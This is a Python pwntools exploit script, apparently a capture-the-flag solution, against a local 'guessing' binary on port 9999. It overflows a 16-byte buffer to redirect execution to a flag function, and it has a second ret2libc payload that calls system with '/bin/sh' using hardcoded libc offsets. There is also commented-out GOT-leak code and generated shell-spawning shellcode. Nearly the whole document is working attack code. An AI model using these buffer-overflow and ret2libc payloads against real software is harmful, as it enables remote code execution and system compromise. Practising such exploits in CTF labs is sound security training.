from pwn import *
context(arch = 'i386', os = 'linux')
shellcode = asm(shellcraft.i386.linux.sh())

payload="AAAAAAAAAAAAAAAA"

atoi_got	=0x804A03C
puts_plt	=0x080484A0	
main		=0x0804863D

atoi_off	=0x002d250
system_off	=0x003ada0
binsh_off	=0x15b9ab

system		=0xf7e3eda0
binsh		=0xf7f5f9ab

flag		=0x080487C5

payload+=p32(flag)

#payload+=p32(puts_plt)
#payload+=p32(main)
#payload+=p32(atoi_got)

payload2="AAAAAAAAAAAAAAAA"
payload2+=p32(system)
payload2+=p32(main)
payload2+=p32(binsh)

#r=process("./guessing")
r=remote("127.0.0.1","9999")
r.recvuntil("Round 1: ")
r.sendline("1")
r.recvuntil("Round 2: ")
r.sendline("1")
r.recvuntil("Round 3: ")
print "payload",payload
r.sendline(payload)
r.interactive()
z=r.recv(1024)
print "recv",z.encode('hex')
l=[]
addr=z.encode("hex")[74:74+8]
for i in range(0,len(addr),2):
	l.append(addr[i:i+2])
addr=eval("0x"+"".join(l[::-1]))
print addr

libc=addr-atoi_off
system=libc+system_off
binsh=libc+binsh_off

log.info("libc "+hex(libc))
log.info("system "+ hex(system))
log.info("binsh "+ hex(binsh))

r.recvuntil("Round 1: ")
r.sendline(payload2)
r.recvuntil("Round 2: ")
r.sendline(payload2)
r.recvuntil("Round 3: ")
print "payload2",payload2
r.sendline(payload2)
r.interactive()
r.recv(1024)






